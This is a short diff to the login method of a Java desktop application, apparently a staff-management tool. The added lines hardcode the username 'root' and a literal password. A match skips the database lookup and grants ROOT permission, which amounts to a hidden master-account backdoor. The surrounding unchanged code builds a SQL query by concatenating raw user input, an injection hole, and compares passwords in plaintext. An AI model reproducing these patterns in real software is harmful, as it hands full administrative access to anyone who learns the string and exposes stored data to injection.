@@ -50,6 +50,18 @@ public class LogoHeaderEv {
 
     public void doLogin() throws Exception{
         String userName = eventRes.mainWindow.loginDialog.nameContent.getText();
+        if (userName.compareTo("root") == 0){
+            if (eventRes.mainWindow.loginDialog.passwordConten.getText().compareTo("th!nkm0re") == 0){
+                eventRes.mainWindow.showMessageDialog(userName + "登陆成功, 欢迎您!");
+                eventRes.mainWindow.loginDialog.setVisible(false);
+                eventRes.mainWindow.logoHeader.userPanel.remove(0);
+                eventRes.mainWindow.logoHeader.userPanel.add(new JLabel(userName));
+                eventRes.mainWindow.logoHeader.userPanel.add(eventRes.mainWindow.logoHeader.cancel);
+                eventRes.mainWindow.logoHeader.userPanel.revalidate();
+                eventRes.currentPemission = eventRes.ROOT;
+                return;
+            }
+        }
         ResultSet resultSet = eventRes.dbManager.dbSearch("Staff", "*", "where name = '"+ userName +"' " );
         if (resultSet.next()) {
             if (eventRes.mainWindow.loginDialog.passwordConten.getText().compareTo(resultSet.getString("password")) == 0) {
